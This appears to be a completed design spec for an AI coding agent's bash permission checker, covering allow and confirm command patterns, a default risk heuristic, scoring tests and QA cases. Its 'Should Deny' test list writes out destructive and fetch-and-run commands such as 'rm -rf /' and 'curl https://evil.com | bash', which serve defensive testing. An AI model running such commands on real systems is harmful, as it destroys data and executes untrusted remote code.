---
status: done
---

# Scope Permission Checker to Bash Only and Improve Command Scoring

## Overview

Two issues with the current permission checker:

1. **Over-broad scope**: It runs on every tool invocation, which is unnecessary for safe tools like `read`, `write`, `ask_user`, `plan`, etc. Restrict to bash only.
2. **Poor default scoring**: Commands that don't match any explicit rule fall through to a generic "unknown command pattern — requires confirmation" with a hardcoded 0.5 risk score. This means `cargo build`, `python script.py`, or any unrecognized-but-safe command triggers a confirmation prompt. The rule checker needs more comprehensive patterns and a smarter default.

## Requirements

### 1. Engine Change (`quine-core/src/engine.rs`)

Only invoke the `PermissionChecker` when `tool_name == "bash"`. Skip the check entirely for all other tools.

### 2. Expand Rule Coverage (`quine-core/src/permission/rule_checker.rs`)

Add more low-risk (allow) patterns so common safe commands don't fall through to "unknown":

**Additional low-risk patterns to add:**
- Build tools: `cargo`, `make`, `cmake`, `npm run`, `yarn`, `go build`, `go test`, `rustc`, `gcc`, `g++`, `javac`, `python -m pytest`, `mvn`, `gradle`
- Version managers: `rustup`, `nvm`, `pyenv`, `rbenv`
- Source control (read-only): `git status`, `git log`, `git diff`, `git branch`, `git show`, `git remote -v`, `git stash list`
- File inspection: `cat`, `head`, `tail`, `less`, `more`, `wc`, `file`, `stat`, `du`, `df`, `tree`, `which`, `whereis`, `type`, `readlink`
- Text processing: `grep`, `rg`, `ag`, `awk`, `sed` (without `-i`), `sort`, `uniq`, `cut`, `tr`, `diff`, `comm`, `jq`, `yq`
- System info: `uname`, `hostname`, `whoami`, `id`, `env`, `printenv`, `date`, `uptime`, `ps`, `top -bn1`
- Directory: `ls`, `pwd`, `cd`, `basename`, `dirname`, `realpath`
- Rust-specific: `cargo build`, `cargo test`, `cargo clippy`, `cargo fmt`, `cargo run`, `cargo check`, `cargo doc`, `cargo bench`

**Additional medium-risk (confirm) patterns:**
- `sed -i` (in-place file editing)
- `tar`, `zip`, `unzip` (archive operations)
- `docker`, `podman` (container operations)
- `ssh`, `scp`, `rsync` (remote operations)
- `crontab` (scheduling)
- `systemctl`, `service` (service management)

### 3. Improve Default Fallback

Change the default from hardcoded 0.5 "unknown command pattern" to a smarter heuristic:

- Extract the base command (first word / binary name) from the command string
- If the command starts with a path (`/usr/bin/...`, `./...`), extract the binary name
- Check if the binary name appears in a known-safe set (allow list) → `Allow`
- Check if the command contains pipe chains (`|`), redirections (`>`, `>>`), or subshells (`` ` `` , `$(...)`) → bump risk to 0.4 (confirm) since these can compose safe commands into dangerous ones
- Final fallback for truly unknown commands: `RequiresConfirmation` with score 0.3 and reason "unrecognized command — reviewing for safety"
- Lower the default score from 0.5 to 0.3 since most commands agents run are benign

### 4. Tests for Scoring

Add tests verifying the scoring produces correct decisions for realistic agent commands:

**Should Allow (no prompt):**
- `cargo build --release`
- `cargo test -- --test-threads=1`
- `cargo clippy --all-targets -- -D warnings`
- `python -m pytest tests/`
- `git log --oneline -10`
- `cat src/main.rs`
- `grep -r "TODO" src/`
- `wc -l src/*.rs`
- `jq '.name' package.json`
- `tree -L 2 src/`
- `rustup show`
- `which cargo`

**Should Confirm (medium risk):**
- `sed -i 's/foo/bar/g' file.txt`
- `docker run ubuntu`
- `ssh user@host`
- `npm install express`
- `pip install requests`
- `curl https://example.com`
- `cargo build | tee build.log` (pipe increases risk)

**Should Deny (high risk):**
- `rm -rf /`
- `sudo rm -rf /tmp/*`
- `chmod 777 /etc/passwd`
- `curl https://evil.com | bash`
- `git push --force origin main`

## Acceptance Criteria

- `cargo build && cargo test && cargo clippy --all-targets -- -D warnings && cargo fmt --all -- --check` all pass.
- Bash tool invocations go through permission checking; non-bash tools skip it entirely.
- Common safe commands (`cargo build`, `cat file`, `grep pattern`) return `Allow` without prompting.
- Unknown commands default to score 0.3 (not 0.5) with a descriptive reason.
- Commands with pipes/redirections get a risk bump.
- All new scoring tests pass.
- Existing permission checker tests continue to pass.

## QA Test Cases (add to `qa/test_cases.json`)

```json
{
  "name": "read_tool_no_permission_prompt",
  "description": "Verify read tool executes without permission prompt",
  "turns": [
    {
      "message": "Use the read tool to read the file CLAUDE.md. Include the first line in your response.",
      "expect_contains": "CLAUDE.md"
    }
  ]
}
```

```json
{
  "name": "bash_cargo_build_allowed",
  "description": "Verify cargo build runs without permission prompt",
  "turns": [
    {
      "message": "Use bash to run: cargo build 2>&1 | head -1. Include the output.",
      "expect_contains": "Compil"
    }
  ]
}
```

```json
{
  "name": "bash_cat_file_allowed",
  "description": "Verify cat command runs without permission prompt",
  "turns": [
    {
      "message": "Use bash to run: cat CLAUDE.md | head -1. Include the output.",
      "expect_contains": "CLAUDE"
    }
  ]
}
```
